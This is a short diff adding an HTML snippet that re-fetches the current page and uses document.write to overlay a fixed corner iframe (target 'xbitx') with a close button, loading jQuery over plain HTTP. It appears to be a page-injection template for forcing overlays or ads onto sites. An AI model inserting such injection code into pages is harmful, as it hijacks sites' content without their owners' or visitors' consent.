@@ -1,0 +1,18 @@
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+<script>
+$(function(){
+		var _c = $("#_11c").html();
+		$.get(window.location.href,function(data){
+			document.write(data+_c);
+		});
+});
+</script>
+<div id="_11c">
+	<script>
+		function c(){x.style.display="none";}
+	</script>
+	<div id=x style="position:absolute;z-index:999999;right:0px;bottom:0px;width:400px;height:300px">
+		<a onClick=c() style="cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px">X</a>
+		<iframe src=xbitx width=400 height=300 scrolling=no frameborder=0></iframe>
+	</div>
+</div>
